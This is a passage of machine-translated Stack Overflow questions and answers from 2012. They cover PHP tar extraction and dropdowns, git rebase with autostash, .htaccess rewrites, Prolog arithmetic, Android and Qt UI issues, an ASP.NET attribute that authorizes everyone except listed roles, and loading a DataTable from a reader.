OUTPUT $action, inserted.TestID, inserted.Row1, inserted.Row2, inserted.DateCreated, inserted.DateUpdated
INTO dbo.Tests_History ([Action], fk_TestID, Row1, Row2, DateCreated, DateUpdated); 
```

在上面的示例中，Tests_import 表是临时登台表，Tests 表是最终导入位置，Tests_History 跟踪每个唯一记录的历史记录。该过程完成后，您可以删除 Tests_import 的内容或将其设置为在 SSIS 包中应用的第一步。这样，您可以将初始导入与最终测试表进行比较，以防在再次运行 SSIS 包之前出现任何问题。

希望这可以帮助。

# php - 如何在 Windows 上以纯 PHP 提取 .tar 文件？

> ID：13870800
> 
> 赞同：2
> 
> 时间：2012-12-14T00:13:10.273
> 
> 标签：php, windows, tar, phar

我有一个要在 Windows 上运行的 PHP 脚本。我需要提取一个 .tar 文件。如何提取 tar 文件。我知道 PharData 类，它适用于 Linux，但不适用于 Windows。我的脚本死了，没有错误输出或任何东西。同样的代码块在 Linux 上运行。我在 Windows 上使用 PHP 5.4.0

```
$phar_data = new PharData($out_filepath);
$phar_data->extractTo($destination_folder); 
```

是否有另一种纯 PHP 方法来提取 .tar 文件？

编辑：我应该说我的真正意图是提取一个 .tar.gz 文件，但 gzopen 做了 .gz 部分。现在我需要处理 .tar 部分

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:31:23.637

太难了。尝试这样的事情：[http ://www.phpclasses.org/package/945-PHP-Create-tar-gzip-bzip2-zip-extract-tar-gzip-bzip2-.html](http://www.phpclasses.org/package/945-PHP-Create-tar-gzip-bzip2-zip-extract-tar-gzip-bzip2-.html)

# php - 使用 PHP 数组填充 HTML 表单下拉菜单

> ID：13870804
> 
> 赞同：0
> 
> 时间：2012-12-14T00:13:25.887
> 
> 标签：php, html, forms

我正在尝试使用当前目录的内容填充 HTML 表单的下拉列表。我尝试使用 PHP 的 scandir() 函数将这些文件作为数组输出，然后将它们输入到 HTML 表单中的选项值标记中。

我查看了 SO 和外部可用的各种解决方案，但似乎没有一个对我有用。

这就是我的代码现在的样子：

```
<form action="" >
        <input type="submit" class="Links" value="Select Input">
        <select >               
            <?php 
                $dir="./inputfiles/"; 
                $filenames = scandir($dir); 
                foreach($filenames as $file){
                    echo '<option value="' . $filenames . '">' . $filenames . '</option>';
                    }
            ?>                      
        </select> 
</form> 
```

现在我在下拉菜单中绝对没有选项。

我对 PHP 非常陌生，非常感谢您对如何进行这项工作的反馈。

* * *

进一步的变化：

我尝试了下面给出的解决方案，但似乎都没有。我更改了代码以检查 PHP 脚本是否能够在 html 表单列表中输出任何变量。

```
<form action="" >
        <input type="submit" class="Links" value="Select Input">
        <select >               
            <?php 
                  $someval = "Video";
                  echo '<option value="value"> ' . $someval .' </option>';
            ?>                      
        </select> 
</form> 
```

它显示 ' 。$一些。而不是菜单栏中的视频

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T00:16:01.787

你必须`$file`在 echo out not中使用`$filenames`。像这样：

```
echo '<option value="' . $file . '">' . $file . '</option>';
```

有关更多信息，请参阅[PHP`foreach`](http://php.net/manual/en/control-structures.foreach.php)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-14T00:16:21.600

遍历数组时，您需要使用`$file`连接，而不是`$filenames`：

```
echo '<option value="' . $file . '">' . $file . '</option>'; 
```

如果`inputfiles`存在于同一目录中，则应使用路径：`inputfiles/`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-14T00:31:08.177

您的脚本有几个问题。

首先，您需要在选项中输出正确的变量：

```
echo '<option value="' . $file . '">' . $file . '</option>'; 
```

其次，您可能需要在循环中添加检测`.`，`..`因为您可能不想输出它们。您可能还想排除目录。

第三，您可能应该明确您要扫描的目录。尝试使用完整的文件路径。如果您需要它相对于当前执行文件的目录，您可以执行以下操作：

```
$dir= __DIR__ . DIRECTORY_SEPARATOR . 'inputfiles'; // no need for trailing slash 
```

Fourth, you might want to consider working with something like DirectoryIterator to give you some more convenient methods to do what you are looking to do (i.e. verifying it's an actual file before listing it). So something like this:

```
$dir= __DIR__ . DIRECTORY_SEPARATOR . 'inputfiles';
$iterator = new DirectoryIterator($dir);
foreach ($iterator as $fileinfo) {
    if($fileinfo->isFile()) {
        echo '<option value="' . $fileinfo->getFilename() . '">' . $fileinfo->getFilename() . '</option>';
    }
} 
```

In this trivial example, it you won't necessarily gain a lot (in terms of saving extra code) by using DirectoryIterator, but I certainly like to point out it's usage when I can, because if you needed to start doing things like showing file size, file permissions, file modification times, etc. It is much easier to do it using the DirectoryIterator class (or RecursiveDirectoryIterator class if you need to recursive) than using traditional PHP's file system functions.

# git - Git - 如何使用当前索引（当前状态）的一些未暂存更改来编辑旧的（不是以前的）提交？

> ID：13870808
> 
> 赞同：7
> 
> 时间：2012-12-14T00:14:11.797
> 
> 标签：git

我已经看过这些以前的问题：

*   [如何在 Git 中将更改的文件添加到较旧的（不是最后的）提交](https://stackoverflow.com/questions/2719579/howto-add-a-changed-file-to-an-older-not-last-commit-in-git)
*   [如何编辑以前的 git 提交？](https://stackoverflow.com/questions/9103396/how-do-i-edit-a-previous-git-commit)

但它们并没有完全解决特定问题 - 索引中还有其他变化！运行`rebase`命令时，git 抱怨：`Cannot rebase: You have unstaged changes.`

### 设想：

最后一个提交之前的提交（我是否将其称为“2 HEADs ago”？）是重构提交。我目前在索引中有许多未暂存的更改，但只有一些我想添加到上一个到最后一个提交中。

我想象这样做的方法是：

1.  `stash`我当前的所有更改
2.  `rebase -i`到上一个到最后一个提交（更改索引和移动 Head，对吗？）
3.  在不更改 Head 的情况下将存储加载到我的索引中（如何？）
4.  使用`add -p`并`commit --amend`有选择地修改这个旧的提交
5.  `rebase --continue`完成（更新孩子，将头移回我开始的地方，索引会发生什么？）
6.  然后弹出/清除存储（索引回到我开始的位置）。

它是否正确？如果是，我该如何执行第 3 步？如果不是，我应该怎么做？

另外，请注意，我仍在学习 git 并且仍然不能 100% 确定我是否正确引用了 git 中的内容（头、索引、存储等）。

* * *

### 解决方案：

对于其他任何人，这可能会有所帮助，这些是我实际采取的步骤：

1.  `git stash`我当前的所有更改
2.  `git rebase -i <ID>`到前一个到最后一个提交的*父级，更改索引并移动 Head*
3.  `git stash apply`在不更改 Head 的情况下将存储加载到我的索引中
    *   如果您有冲突，`git reset HEAD <file>`卸载文件暂存。确保分期清晰。
4.  使用`add -p`和`commit --amend`选择性地暂存更改并提交它们
5.  `git reset --hard`丢弃索引，使其与 Head 匹配
6.  `git rebase --continue`完成。更新孩子，移动头回到最开始，但有变化
    *   历史现在分为两个版本。另一个分支在之前隐藏的 WIP 处结束
7.  然后弹出存储以将索引带回我开始的位置。另一个分支也被清除。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-06-24T20:44:31.963

使用[git1.8.4（2013 年 7 月）](https://github.com/git/git/blob/master/Documentation/RelNotes/1.8.4.txt#L53-L55)，您可以选择：

*   变基
*   同时保持本地未分级的更改！

> " `git rebase`"学到了 " `--[no-]autostash`" 保存本地更改而不是拒绝运行的选项（人们的正常反应是存储它们并重新运行）。

因此，在您的情况下，这可能有效（同时保存您正在进行的工作）：

```
git rebase --autostash -i <ID> 
```

请参阅[提交 587947750bd73544a6a99811f0ddfd64e1ff1445](https://github.com/git/git/commit/587947750bd73544a6a99811f0ddfd64e1ff1445)：

> 这个新功能允许在脏工作树或索引上执行变基。
> 它的工作原理是从工作树和索引更改（通过'git stash create'）中创建一个临时的“悬空合并提交”，并在成功变基或中止后自动应用它。
> 
> `rebase`存储临时合并提交的 SHA-1 十六进制以及其余的变基状态，`.git/{rebase-merge,rebase-apply}/autostash`具体取决于变基的类型。
> 由于`$state_dir`在成功的变基或中止结束时会自动删除，所以`autostash`.
> 
> **这种方法的优点是我们不会影响普通存储的 reflogs，从而使`autostash`最终用户不可见。
> 这意味着您可以像往常一样在变基期间使用“git stash”。**
> 
> 当`autostash`应用程序导致冲突时，我们推`$state_dir/autostash`送到正常存储并删除`$state_dir`结束 rebase。
> 用户可以检查存储，并随时弹出或删除。

* * *

注意：git 2.0.1（2014 年 7 月 25 日）处理 autostash 情况。
请参阅[Ramkumar Ramachandra (](https://github.com/artagnon) [)](https://github.com/artagnon)的[提交 e4244eb](https://github.com/git/git/commit/e4244eb3957d478ca05b42d8b56aadb9ab2bc7ae)（也在[他的博客](http://artagnon.com/git-rebase.autostash)中）：[`artagnon`](https://github.com/artagnon)

### `rebase -i`：处理“无事可做”的情况`autostash`

> 当用户调用

```
$ git rebase -i @~3 
```

> 带有脏文件并`rebase.autostash`打开，并`$EDITOR`以空缓冲区退出，自动存储无法应用。
> 
> 尽管 rr/rebase-autostash 的主要重点是让`git-rebase--backend.sh`脚本将控制权返回给`git-rebase.sh`，但它在`git-rebase--interactive.sh`.
> 由于这种情况与其他返回家务控制权的情况不同，因此为其分配一个特殊的返回状态并在 git-rebase.sh 中显式处理该返回值。

* * *

## 使用最新的 git，只需`git config rebase.autostash true`在`rebase [-i]`脏工作树中工作即可。

> 这个新功能允许在脏工作树或索引上执行变基。
> 它的工作原理是从工作树和索引更改（通过''）中创建一个临时的“悬空合并提交” `git stash create`，并在成功变基或中止后自动应用它。
> 
> rebase 存储临时合并提交的 SHA-1 十六进制以及其余的 rebase 状态，`.git/{rebase-merge,rebase-apply}/autostash`具体取决于 rebase 的类型。由于`$state_dir`在成功的变基或中止结束时会自动删除，所以`autostash`.
> 
> 这种方法的优点是我们不会影响普通存储的 reflogs，从而使最终用户无法看到自动存储。这意味着您可以`git stash`像往常一样在变基期间使用 ' '。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-14T00:41:29.027

如果我了解您想要做什么，这与您的第一个链接上的答案没有太大不同，您只需将不想添加到旧提交中的更改存储*起来*。你可以这样做：

1.  提交您想要添加到倒数第二次提交的更改。只需给它一个简单的提交消息，例如“添加这个”，因为它不会存在很长时间。
2.  存储您不想添加到提交中的剩余更改。
3.  查找您要添加到的提交的*父级。*例如，如果您要修改的提交具有 SHA1`aaaaaaa`且其父级为`bbbbbbb`，则您需要`bbbbbbb`.
4.  执行`git rebase -i bbbbbbb`（替换步骤 3 中确定的正确提交）。将最近的提交（“添加这个”）移动到您正在修改的提交下方，并将其从 更改`pick`为`fixup`. 这会将其添加到该提交中，而不会更改该提交的消息。
5.  从步骤 1 中取消存储更改，然后从那里进行更改。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-14T00:28:49.827

你的计划听起来不错。A `git stash apply`or`git stash pop`将修改工作树和/或索引，但不会更改 HEAD，因此您应该能够在 rebase 编辑中执行此操作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-14T00:37:19.860

```
`git stash`
`git checkout <COMMIT HASH from 2 commits ago>`
`git stash pop`
`git add` (selectively--one file at a time)
`git commit --amend`
`git stash` (to re-stash all the changes you didn't commit)
`git branch temp`
`git checkout master`
`git rebase temp -i` 
```

这将打开一个带有提交列表的文本编辑器——每行一个提交。删除第一行，这是您要替换的旧提交。保存并关闭。

```
`git branch -d temp` (to clean up the branch you created) 
```

# .htaccess - Htaccess 问题

> ID：13870813
> 
> 赞同：0
> 
> 时间：2012-12-14T00:14:32.223
> 
> 标签：.htaccess

这是我当前的 htaccess 脚本

```
 RewriteEngine On 
 RewriteCond %{REQUEST_METHOD} ^TRACE 
 RewriteRule .* - [F]

 RewriteBase /

 RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC] 
 RewriteRule ^(.*)$ http://%1/$1 [R=301,L]

 RewriteRule ^home$ /index.php?hook=home [NC] 
```

但是当我添加 $_GET 变量时出现问题，例如：

www.domain.com/home&showPoll=1

输出：

> ```
> Not Found
> 
> The requested URL /home&showPoll=1 was not found on this server. 
> ```

有没有办法解决它？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T02:49:49.677

`www.domain.com/home&showPoll=1`不是 GET 变量，因为您缺少`?`. 通常，您可以只包含 a`QSA`以包含现有的查询字符串：

```
RewriteRule ^home$ /index.php?hook=home [NC,QSA] 
```

但是，如果您的 URL 字面上缺少，`?`那么您可以尝试使用分组来解析该部分：

```
RewriteRule ^home&?(.*)$ /index.php?hook=home&$1 [NC] 
```

# prolog - 使用查询结果进行计算

> ID：13870814
> 
> 赞同：1
> 
> 时间：2012-12-14T00:14:35.110
> 
> 标签：prolog

当然这是一个愚蠢的问题，但我自己无法回答。我有以下代码：

```
%% Ownedby-relationship in monopoly
ownedby(bank,weststation).

%% Account-Value:
account(player1,1500).

%% Prices
price(weststation,200).

%% Buy an estate in monopoly
buy(X,Y):-
    ownedby(bank,X),
    !,
    retract(ownedby(bank, X)),
    assert(ownedby(Y,X)),
    price(X,Price),
    account(Y,Accountold),
    retract(account(Y,Accountold)),
    assert(account(Y,Accountold-Price)).

%% Example:
buy(player1,weststation).

%% RESULT: 
account(player1,X).
1500-200 
```

所以字符串 1500 和 200 被连接，但没有数字被减去...... :( 什么原因？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T06:30:36.490

您的规则需要更正

```
...
NewValue is Accountold-Price,
assert(account(Y,NewValue)). 
```

# objective-c - NSColor Set - 它有什么作用？

> ID：13870820
> 
> 赞同：0
> 
> 时间：2012-12-14T00:15:02.910
> 
> 标签：objective-c, cocoa

我正在关注一个教程，下面的方法属于一个从`NSview`. 它只是绘制一个红色矩形。我只是无法弄清楚它是如何做到的。我不明白设置的消息在做什么`[bkgColor set]`以及它如何影响背景颜色？

```
- (void) drawRect: (NSRect) rect {
    NSRect bounds = [self bounds];
    NSColor *bkgColor = [NSColor redColor];
    [bkgColor set];
    [NSBezierPath fillRect: bounds];
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-14T00:21:48.803

该`set`方法为后续绘图命令设置当前绘图上下文的颜色。把它想象成你有一盒蜡笔。如果你拿起红色蜡笔，这相当于`[[NSColor redColor] set]`，所以现在如果你画线条或形状，它们将是红色的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T00:18:32.700

它以贝塞尔路径用红色填充矩形的方式设置颜色。
如果你没有设置颜色，它使用之前设置的颜色（如果你没有设置一个，则默认一个）。所以如果颜色是 greenColor，你会看到所有的矩形都用绿色填充。就这么简单。

# android - android数字时钟每5秒更新一次

> ID：13870822
> 
> 赞同：1
> 
> 时间：2012-12-14T00:15:12.443
> 
> 标签：android, textview, clock, digital

这个想法是在前屏幕顶部的一个框中显示当前系统时间，以小时：分钟：秒等数字格式显示。它需要不断更新。但是，如果您每 1 秒更新一次秒数，它可能会使系统停机。因此，我希望用户能够选择更新速率（每 1 秒、5 秒或 10 秒）。问题是：我如何每 5 秒更新一次文本视图？我们编写这段代码：

```
package com.example.software;

import android.os.Bundle;
import android.app.Activity;
import android.text.format.Time;
import android.view.Menu;
import android.widget.TextView;

public class MainActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Time dtNow = new Time();
        dtNow.setToNow();
        int hours;
        int minutes;
        int second;
        int i=100;
        int j=0;
        TextView txt =(TextView) findViewById(R.id.txt_view);

        while(i>0){

            hours = dtNow.hour;
            minutes= dtNow.minute;
            second = dtNow.second;
            txt.setText(hours+":"+minutes+":"+second);
        try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {

                e.printStackTrace();
        }

        }

    }

} 
```

我将此代码更新为：

```
package com.example.softwareproject;

import android.os.Bundle;
import android.app.Activity;
import android.text.format.Time;
import android.view.Menu;
import android.widget.TextView;

public class MainActivity extends Activity {

     Time dtNow = new Time();

     int hours;
     int minutes;
     int second;
     int i=100;
     int j=0;

     @Override
    public void onCreate(Bundle savedInstanceState) {

         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         display();
    }

    public void display(){

        new Thread(new Runnable(){

            public void run() {

            while(i>0){
                    TextView txt =(TextView) findViewById(R.id.txt_view);
                    dtNow.setToNow();
                    hours = dtNow.hour;
                    minutes= dtNow.minute;
                    second = dtNow.second;
                    txt.setText(hours+":"+minutes+":"+second);

                        try{
                            Thread.sleep(5000);
                            }
                        catch (InterruptedException e) {
                            e.printStackTrace();
                            }
                        }
                 }
        }).start();

    }

} 
```

但我仍然有这个错误：

```
[2012-12-14 03:54:25 - SoftwareProject] ActivityManager: Starting: Intent { act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=com.example.softwareproject/.MainActivity }
[2012-12-14 03:54:25 - SoftwareProject] ActivityManager: Warning: Activity not started, its current task has been brought to the front 
```

并且应用程序停止了。

# c++ - 如何摆脱 QSpinBox 中的前导零

> ID：13870823
> 
> 赞同：2
> 
> 时间：2012-12-14T00:15:35.777
> 
> 标签：c++, qt, qt4

我正在使用一个 QSpinBox，可用于输入 0 到 33 之间的值。默认值为零。如果我使用键盘输入数字，它会保留前导零，这很烦人。

示例：我想通过键盘输入 23

我输入“2”——旋转框的值变为“02”

我输入“3” - 没有任何反应 - 旋转框已满

如何防止这种行为？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-04-28T12:43:54.390

我对 QDoubleSpinBox 也有类似的问题，其中尾随零使编辑不方便。

我通过重新实现 QDoubleSpinBox::textFromValue() 来修剪零点来解决它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-14T00:28:41.230

在侦听器中添加一行代码`valueChanged`以删除前导零。

```
if (mySpinBox.value.length() > 1 && mySpinBox.value[0] == '0')
{
     mySpinBox.value = mySpinBox.value.remove(0, 1);
} 
```

# java - 如何获取传递给 HTTP POST 的参数

> ID：13870825
> 
> 赞同：0
> 
> 时间：2012-12-14T00:15:43.427
> 
> 标签：java, glassfish, jersey, httprequest

这是我在 RESTful Web 服务中使用的代码片段。我正在向**create(Employee entity)** 方法发送 JSON 数据。我想从 servlet 请求中获取 JSON 数据。

*我使用的 System.out.println(..)*方法被打印出来，这意味着**stringBuffer**不是 NULL；但是在“：”字符之后没有打印任何内容[我正在 glassfish 记录器中检查这个]。此外，POSTed 实体正在正确地保存到数据库中。

我已经在 stackoverflow 和其他网站上搜索了许多与此相关的问题，但到目前为止我没有尝试过任何工作。

```
public class EmployeeFacadeREST extends AbstractFacade<Employee> {
@Context private HttpServletRequest servletRequest;
@PersistenceContext(unitName = "EmployeePU")
private EntityManager em;

public EmployeeFacadeREST() {
    super(Employee.class);
}

@POST
@Override
@Consumes({"application/xml", "application/json"})

public void create( Employee entity) {
    StringBuffer stringBuffer = null;
    try{
        InputStream body = servletRequest.getInputStream();           
        stringBuffer = new StringBuffer();
        int d;
        while((d = body.read()) != -1){
            stringBuffer.append((char)d);
        }
    }

    catch(IOException e){

    }
    if(stringBuffer != null){
        System.out.println("the entity is: " + stringBuffer.toString()); // this line gets printed
    }
    super.create(entity);
}
// more code 
```

}

感谢您的洞察力。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T00:28:19.807

服务器已经使用了请求正文，以便自动为您将其反序列化为 Employee 实体。您无法再次读取相同的输入流。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T00:23:02.220

You need to set the 'entity' used by the POST with the value of your stringbuffer.

check the tests or samples of a jersey /glassfish POST .

The POST.entity expects the value u want in the body of the POST.

# android - Runtime.exec 有时会抛出 IllegalMonitorStateException

> ID：13870832
> 
> 赞同：2
> 
> 时间：2012-12-14T00:16:29.380
> 
> 标签：android

我们有以下代码有时会抛出 java.lang.IllegalMonitorStateException: unlock of unowned monitor

```
Runtime run = Runtime.getRuntime();
Process p = run.exec(SOME_COMMAND); 
```

此代码在应用程序启动时很早就执行。

如果我手动启动应用程序，它工作正常。我从未见过它有任何问题（对于数百次发射）。

但是，当它作为测试自动化的一部分启动时，有时此代码会因该异常而失败。我们的测试自动化执行以下操作：

*   安装我们的应用程序
*   立即启动
*   执行一些测试
*   卸载应用
*   再次安装应用
*   再次启动它

这是崩溃的堆栈跟踪。

```
 11-14 14:59:26.675: W/dalvikvm(3788): threadid=12: thread exiting with uncaught exception (group=0xb4120180)
    11-14 14:59:26.675: E/AndroidRuntime(3788): FATAL EXCEPTION: SomeThread
    11-14 14:59:26.675: E/AndroidRuntime(3788): java.lang.IllegalMonitorStateException: unlock of unowned monitor
    11-14 14:59:26.675: E/AndroidRuntime(3788):     at java.lang.ProcessManager.exec(ProcessManager.java:229)
    11-14 14:59:26.675: E/AndroidRuntime(3788):     at java.lang.Runtime.exec(Runtime.java:168)
    11-14 14:59:26.675: E/AndroidRuntime(3788):     at java.lang.Runtime.exec(Runtime.java:241)
    11-14 14:59:26.675: E/AndroidRuntime(3788):     at java.lang.Runtime.exec(Runtime.java:184)
    11-14 14:59:26.675: E/AndroidRuntime(3788):     at aaa.SomeThread.run(SomeThread.java:41) 
```

我感谢任何想法或信息。

# c# - 除了给定的用户/角色之外，一个动作可以授权所有人吗？

> ID：13870833
> 
> 赞同：3
> 
> 时间：2012-12-14T00:16:39.867
> 
> 标签：c#, asp.net-mvc

使用 [Authorize] 属性很容易将操作设置为仅由特定用户或角色允许。例如

```
[Authorize(Roles = "Administrator")]
public ActionResult Index()
{
  ... 
```

但是，当我想要反转时遇到了问题。有没有办法使用 MVC 框架功能来允许所有经过身份验证的用户，*除了*那些由名称或角色指定的用户？

所需的用法类似于：

```
[DoNotAuthorize(Roles = "RestrictedUser")]
public ActionResult Index()
{
  ... 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-14T00:16:39.867

一种相当简单的解决方案是从 AuthorizeAttribute 类派生并覆盖其 AuthorizeCore 方法，交换其真/假逻辑。

```
/// <summary>
/// Authorizes any authenticated user *except* those who match the provided Users or Roles.
/// </summary>
public class DoNotAuthorizeAttribute : AuthorizeAttribute
{
    /// <summary>
    /// This is effectively a copy of the MVC source for AuthorizeCore with true/false logic swapped.
    /// </summary>
    /// <param name="httpContext">The HTTP context, which encapsulates all HTTP-specific information about an individual HTTP request.</param>
    /// <returns>true if the user is authorized; otherwise, false.</returns>
    protected override bool AuthorizeCore(HttpContextBase httpContext)
    {
        if (httpContext == null)
        {
            throw new ArgumentNullException("httpContext");
        }
        IPrincipal user = httpContext.User;
        if (!user.Identity.IsAuthenticated)
        {
            return false;
        }

        string[] usersSplit = SplitString(Users);
        if ((usersSplit.Length > 0) && usersSplit.Contains<string>(user.Identity.Name, StringComparer.OrdinalIgnoreCase))
        {
            return false;
        }

        string[] rolesSplit = SplitString(Roles);
        if ((rolesSplit.Length > 0) && rolesSplit.Any<string>(new Func<string, bool>(user.IsInRole)))
        {
            return false;
        }

        return true;
    }

    /// <summary>
    /// This is a direct copy of the MVC source for the internal SplitString method.
    /// </summary>
    /// <param name="original">The original string to split.</param>
    /// <returns>An array of strings.</returns>
    internal static string[] SplitString(string original)
    {
        if (string.IsNullOrWhiteSpace(original))
        {
            return new string[0];
        }
        return (from piece in original.Split(new[] { ',' })
                let trimmed = piece.Trim()
                where !string.IsNullOrEmpty(trimmed)
                select trimmed).ToArray<string>();
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-14T00:21:45.317

您可以只列出接受的角色并将异常排除在外

```
[Authorize(Roles = "Administrator, Admin, SuperUser")]
public ActionResult Index()
{
} 
```

或者使用该逻辑创建一个特殊的 AuthorizeAttribute

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-08-04T13:07:39.257

老问题，但对于那些需要它的人 - 非常简单，您可以使用 Policy 来处理它：

只需添加类：

```
public class CustomRoleRequirement : AuthorizationHandler<CustomRoleRequirement>, IAuthorizationRequirement
{
    protected override Task HandleRequirementAsync(AuthorizationHandlerContext context, CustomRoleRequirement requirement)
    {
        var roles = new[] { "YourExcludedRole1", "YourExcludedRole2", "YourExcludedRole3"}; 
        var userIsInRole = roles.Any(role => context.User.IsInRole(role));
        if (userIsInRole)
        {
            context.Fail();
            return Task.FromResult(false);
        }

        context.Succeed(requirement);
        return Task.FromResult(true);
    }
} 
```

然后添加到startup.cs

```
public void ConfigureServices(IServiceCollection services)
{
     ...

     services.AddAuthorization(options => {
            options.AddPolicy("ExcludeRoles", policy => policy.AddRequirements(new CustomRoleRequirement()));
        });

     ...
} 
```

然后您可以简单地使用`[Authorize(Policy = "ExcludeRoles")]`并且所有角色都将被授权排除`"YourExcludedRole1", "YourExcludedRole2", "YourExcludedRole3"`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-12-24T11:55:25.223

以下代码简单地否定授予指定用户/角色的授权，有效地成为除指定用户/角色之外的所有人的授权。

就像使用 AuthorizeAttribute 类一样使用它。

```
[AttributeUsage(AttributeTargets.Class | AttributeTargets.Method, Inherited = true, AllowMultiple = false)]
public class DoNotAuthorizeAttribute : AuthorizeAttribute
{
    protected override bool AuthorizeCore(HttpContextBase httpContext) => !base.AuthorizeCore(httpContext);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-07-20T07:40:47.887

一种授权特定用户并将其分配给不同控制器或操作的方法：创建一个简单的静态类并创建 const 变量。

```
public static class RolesText
    {
        public const string MISDeveloper = "MIS Developer";
        public const string SuperAdmin = "Super Admin";
        public const string Admin = "Admin";
        public const string DistrictMnE = "District M&E";
        public const string PSUEngineer = "PSU Engineer";
        public const string Guest = "Guest";

        public const string All_Users = MISDeveloper + "," + SuperAdmin + "," + Admin + "," + DistrictMnE + "," + PSUEngineer + "," + Guest;
        public const string Without_PSUEng_DistMnE = MISDeveloper + "," + SuperAdmin + "," + Admin + "," + Guest;
        public const string Without_PSUEng_Guest = MISDeveloper + "," + SuperAdmin + "," + Admin + "," + DistrictMnE;
        public const string Without_DistMnE_Guest = MISDeveloper + "," + SuperAdmin + "," + Admin + "," + PSUEngineer;
    } 
```

然后像下面这样调用这些值。

```
[Authorize(Roles = RolesText.Without_PSUEng_Guest)]
    public class NeedBasedSMsController : Controller
    {
        private AUPDBEntities db = new AUPDBEntities();
    } 
```

如果要分配不同的用户，请按如下方式调用它。

```
[Authorize(Roles = RolesText.Admin + "," + RolesText.Guest)]
public class MyController : Controller
{
    // YOUR CONTROLLER CLASS
} 
```

# java - 使用选择排序算法对字符串进行排序

> ID：13870837
> 
> 赞同：1
> 
> 时间：2012-12-14T00:17:01.630
> 
> 标签：java, string, sorting

我知道有一种简单的方法可以做到这一点......话虽如此，我正在尝试使用选择排序和 stringBuilder 类对字符串进行排序，但我得到了一个无限循环。如果有人可以提供帮助，不胜感激。包 Chapter9Str; 导入 java.util.*；

```
public class SortedString {

    public static void main(String[] args) {
        String input = "cabed";

        System.out.println(sort(input));
    }

    public static String sort(String str) {     
        StringBuilder sb = new StringBuilder(str);

        for(int i=0; i<sb.length()-1; i++) {
            char tmp;
            for(int j=i+1; j<sb.length(); j++) {
                if(sb.charAt(j) < sb.charAt(i)) {
                    tmp = sb.charAt(i);
                    sb.insert(i, sb.charAt(j));
                    sb.insert(j,  tmp);
                }
            }
        }
        return sb.toString();       

    }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T00:21:36.860

每次交换时，实际上都是在增加字符串的长度。

```
 if(sb.charAt(j) < sb.charAt(i)) {
                tmp = sb.charAt(i);
                sb.insert(i, sb.charAt(j));
                sb.insert(j,  tmp);
            } 
```

Insert 在指定位置腾出空间，而不是替换那里的字符。例如，如果你从 开始`acbd`，在你点击那段代码之后，你会留下`abccbd`，而不是`abcd`。

我认为您正在寻找的是[setCharAt](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/StringBuilder.html#setCharAt%28int,%20char%29)方法。

# python - 分析时缺少内存

> ID：13870839
> 
> 赞同：1
> 
> 时间：2012-12-14T00:17:03.830
> 
> 标签：python, memory, memory-leaks, profiling

我正在使用大量内存分析器来找出我的 python 程序中发生的内存膨胀。正如您在下面的时间线中看到的那样，时间线中 t1 和 t2 之间的内存量根据任务管理器报告的内容增长了大约 20 MB，但基于 heapy 仅增长了 1.6 MB。剩下的内存在哪里？这是否表明碎片化？如何验证哪个对象（例如 CloudEntry）导致碎片？

时间线：

t1（**66 MB**专用字节任务管理器）

```
hpy().setrelheap()
// program runs ... 
// ...
// ..
// . 
```

t2（私有字节任务管理器中的**86 MB ）：**

```
Partition of a set of 21897 objects. Total size = 1868016 bytes.
 Index  Count   %     Size   % Cumulative  % Kind (class / dict of class)
     0    926   4   485224  26    485224  26 dict of common.cloud_entry.CloudEntry
     1   5564  25   431040  23    916264  49 str
     2   1888   9   219008  12   1135272  61 __builtin__.set
     3    388   2   203312  11   1338584  72 dict of Queue.Queue
     4   1164   5   162960   9   1501544  80 dict of threading._Condition
     5   2328  11    83808   4   1585352  85 types.BuiltinFunctionType
     6   4561  21    54732   3   1640084  88 int
     7   1172   5    44688   2   1684772  90 list
     8   1164   5    37248   2   1722020  92 threading._Condition
     9    926   4    29632   2   1751652  94 common.cloud_entry.CloudEntry
<64 more rows. Type e.g. '_.more' to view.> 
```

# c# - 用 DataTable 替换 DataReader

> ID：13870843
> 
> 赞同：46
> 
> 时间：2012-12-14T00:17:27.293
> 
> 标签：c#, .net, .net-3.5, datatable, sqlcommand

我正在修改其他人编写的一些代码，并且出于时间的原因需要返回一个 DataTable。

我有这样的代码：

```
using (SqlCommand command = new SqlCommand(query, conn))
{
      //add parameters and their values

      using (SqlDataReader dr = command.ExecuteReader())
      {
          return dr;
      } 
```

但是返回数据表的最佳方法是什么？

* * *

## 回答 #1

> 赞同：88
> 
> 时间：2012-12-14T00:25:05.573

使用[DataTable.Load](http://msdn.microsoft.com/en-us/library/7x8ccbsb%28v=vs.100%29.aspx)方法用 SqlDataReader 中的值填充表：

```
using (SqlDataReader dr = command.ExecuteReader())
{
    var tb = new DataTable();
    tb.Load(dr);
    return tb;
} 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-12-14T00:25:37.087

